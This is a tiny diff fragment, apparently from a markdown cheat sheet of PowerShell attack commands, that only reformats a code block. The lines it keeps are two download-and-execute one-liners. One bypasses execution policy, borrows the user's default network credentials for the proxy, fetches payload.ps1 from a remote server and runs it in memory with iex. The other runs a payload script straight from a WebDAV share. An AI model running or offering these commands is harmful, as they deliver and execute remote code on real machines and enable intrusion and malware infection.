@@ -1,5 +1,4 @@
-```powershell
-powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://server/payload.ps1')|iex"```
+```powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://server/payload.ps1')|iex"```
 
 ```powershell -exec bypass -f \\webdavserver\folder\payload.ps1```
 
